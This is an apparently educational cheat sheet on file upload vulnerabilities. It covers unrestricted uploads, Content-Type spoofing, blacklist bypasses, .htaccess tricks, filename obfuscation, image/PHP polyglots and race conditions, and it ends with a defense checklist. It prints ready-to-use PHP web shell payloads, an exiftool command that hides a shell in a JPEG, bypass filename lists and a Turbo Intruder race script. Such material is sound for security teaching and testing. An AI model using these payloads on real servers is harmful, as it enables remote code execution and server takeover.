# Complete File Upload Vulnerabilities

----------(Claude)-----------

## 🗺️ Big Picture Overview

```
FILE UPLOAD VULNERABILITIES
         │
         ├── 1. No Validation
         ├── 2. Flawed Type Validation
         ├── 3. Blacklist Bypass
         ├── 4. Config File Upload
         ├── 5. Extension Obfuscation
         ├── 6. Content Validation Bypass
         └── 7. Race Conditions
```

---

## 📌 Attack 1 — No Validation (Unrestricted Upload)

### What it is:
Server accepts **any file** without checking anything.

### Attack:
```
Upload: evil.php
Content: <?php echo system($_GET['cmd']); ?>
Visit:  /uploads/evil.php?cmd=whoami
Result: Full server control! 💀
```

### Impact:
```
✅ Read any file on server
✅ Execute system commands
✅ Full Remote Code Execution (RCE)
```

---

## 📌 Attack 2 — Flawed Content-Type Validation

### What it is:
Server only checks the **Content-Type header** — which attackers can freely change!

### Attack:
```
Normal upload:
Content-Type: application/x-php  ← BLOCKED ❌

Modified in Burp:
Content-Type: image/jpeg          ← ALLOWED ✅

File still contains PHP code! 
```

### How to exploit:
```
1. Upload PHP file
2. Intercept in Burp Suite
3. Change Content-Type header to image/jpeg
4. Forward request
5. Execute shell!
```

---

## 📌 Attack 3 — Blacklist Bypass (Alternative Extensions)

### What it is:
Server blocks `.php` but forgets **other executable extensions!**

### Attack — Alternative Extensions:
```
Blocked:          Alternatives:
.php         →    .php5
                  .php7
                  .phtml
                  .phar
                  .shtml
```

### Attack — Bypass Table:
```
Extension   Works on
─────────────────────
.php5       Apache
.phtml      Apache
.phar       PHP
.shtml      Apache SSI
.asp        IIS
.aspx       IIS
.jsp        Java servers
```

---

## 📌 Attack 4 — Config File Upload (.htaccess)

### What it is:
Upload a **server configuration file** that changes the rules — making the server execute a custom extension as PHP!

### Attack Steps:
```
Step 1: Upload .htaccess containing:
        AddType application/x-httpd-php .l33t

Step 2: Upload evil.l33t containing:
        <?php echo system($_GET['cmd']); ?>

Step 3: Visit /uploads/evil.l33t
        Server treats .l33t as PHP → RCE! 💀
```

### Config files by server:
```
Apache:  .htaccess
IIS:     web.config
```

### Why it works:
```
Blacklist blocks: .php ❌
Doesn't block:    .htaccess ✅ (oops!)
                  .l33t ✅ (not dangerous... until now!)
```

---

## 📌 Attack 5 — Extension Obfuscation

### What it is:
Disguise the `.php` extension so the **checker doesn't recognize it** but the **server still executes it!**

### All Obfuscation Techniques:

#### 5a — Case Manipulation:
```
exploit.pHp
exploit.PHP
exploit.PhP
```
*Works when checker is case-sensitive but server isn't*

#### 5b — Multiple Extensions:
```
exploit.php.jpg
exploit.jpg.php
```
*Checker reads last extension (.jpg), server reads first (.php)*

#### 5c — Trailing Characters:
```
exploit.php.
exploit.php (space)
```
*Checker sees "php." ≠ "php", server strips the dot*

#### 5d — URL Encoding:
```
exploit%2Ephp    (%2E = .)
exploit%252Ephp  (double encoded)
```
*Checker sees no dot, server decodes %2E → . → runs PHP*

#### 5e — Null Byte:
```
exploit.php%00.jpg
exploit.php;.jpg
```
*Checker reads full name ending .jpg, server stops at null byte → .php*

#### 5f — Unicode Characters:
```
exploit[xC0 x2E]php
exploit[xC4 xAE]php
```
*Exotic characters that convert to "." after unicode normalization*

#### 5g — Strip Bypass:
```
Input:    exploit.p.phphp
Strip:    removes "php"
Result:   exploit.p.php  ← still PHP! 💀
```
*Stripping isn't applied recursively*

### Quick Reference Table:
```
Technique        Example                  Bypass mechanism
──────────────────────────────────────────────────────────
Case             evil.pHp                 Case sensitivity gap
Multi-ext        evil.php.jpg             Parser disagreement  
Trailing         evil.php.                Dot stripping
URL encode       evil%2Ephp               Decode timing gap
Null byte        evil.php%00.jpg          Language level gap
Unicode          evil[xC0x2E]php          Charset conversion
Strip bypass     evil.p.phphp             Non-recursive strip
```

---

## 📌 Attack 6 — Content Validation Bypass (Polyglot)

### What it is:
Server checks **actual file contents** — magic bytes and dimensions. Attacker creates a file that is **BOTH a valid image AND a PHP script!**

### Magic Bytes Reference:
```
File Type    Magic Bytes      ASCII
─────────────────────────────────────
JPEG         FF D8 FF         ÿØÿ
PNG          89 50 4E 47      .PNG
GIF          47 49 46 38      GIF8
PDF          25 50 44 46      %PDF
PHP          3C 3F 70 68      <?ph
```

### Creating a Polyglot File:
```bash
# Using ExifTool — inject PHP into real image metadata
exiftool -Comment="<?php echo system(\$_GET['cmd']); ?>" \
  legitimate.jpg -o polyglot.php
```

### Why it passes ALL checks:
```
Check                  Result
────────────────────────────────────────
Magic bytes (FF D8 FF) ✅ Real JPEG header!
Has dimensions?        ✅ Real image dimensions!
Content-Type header?   ✅ Says image/jpeg!
File contents?         ✅ Contains real image data!

Hidden inside:         😈 PHP code in metadata!
```

### How PHP executes it:
```
[FF D8 FF garbage...][<?php system($_GET['cmd']); ?>][more garbage]
      ↑                          ↑                        ↑
  PHP ignores              PHP executes THIS!          PHP ignores
```

---

## 📌 Attack 7 — Race Conditions

### What it is:
Exploit the **tiny time gap** between a file being saved and being validated/deleted!

### Type A — Filesystem Race:
```
Timeline:
0ms  → File saved to public folder  ← LIVE!
1ms  → Validation/AV scan starts
2ms  → [ATTACKER EXECUTES FILE] 💀
3ms  → Scan completes: "malware!"
4ms  → File deleted
5ms  → User sees "rejected"
```

**Exploit:** Send upload + execute requests simultaneously in loops!

### Type B — URL Upload Race:
```
Server fetches URL → saves to /tmp/[random]/evil.php
                                    ↑
                          Attacker brute forces
                          this random name!
```

**Why random isn't always random:**
```
PHP uniqid() = based on timestamp
Attacker knows approximate time → brute force ~1000 values!
```

### Extending the Window:
```
Small file:   window = ~2ms    (hard to hit)
Large file:   window = ~500ms  (easy to hit!)

Trick: Payload at START + massive padding at END
[<?php code ?>][AAAAAAAAAAAAAAAAAAAAAAAAA... 10MB]
      ↑                    ↑
  Executes early    Keeps upload busy longer
```

### Exploit Method (Burp Turbo Intruder):
```python
# Thread 1: Keep uploading
engine.queue(uploadRequest, times=50)

# Thread 2: Keep requesting execution  
engine.queue(executeRequest, times=50)

# One request WILL hit the window! ⚡
```



## 🛡️ Complete Defense Checklist

```
VALIDATION:
□ Whitelist only safe extensions (.jpg, .png, .gif)
□ Never use blacklists alone
□ Check magic bytes (actual file contents)
□ Verify image dimensions
□ Strip ALL metadata from images
□ Re-encode images from scratch on upload

STORAGE:
□ Store uploads OUTSIDE web root
□ Never execute files from upload directory
□ Rename files to random names on upload
□ Use private temp folder (not public) for validation

CONFIGURATION:
□ Block .htaccess uploads
□ Block web.config uploads  
□ Disable script execution in upload folders
□ Use separate domain for serving user content

PROCESSING:
□ Validate BEFORE saving to filesystem
□ Use framework's built-in upload handling
□ Use cryptographically secure random names
□ Set strict file size limits

SERVER:
□ Run with minimal permissions
□ Use Content-Security-Policy headers
□ Serve uploads from separate cookieless domain
```

---


```
Every attack exploits a GAP between:

WHAT THE CHECKER SEES  ≠  WHAT THE SERVER DOES

Checker sees .jpg    → Server executes .php
Checker sees image   → Server runs code
Checker blocks file  → Race condition runs it first
Checker sees safe    → Polyglot executes hidden code

FIX THE GAP = Fix the vulnerability! 🔒
```

> **Golden Rule:** Never trust anything the user provides — not the filename, not the Content-Type header, not even the file contents. Validate everything, sanitize everything, and **never execute anything from an upload directory!** 🔐
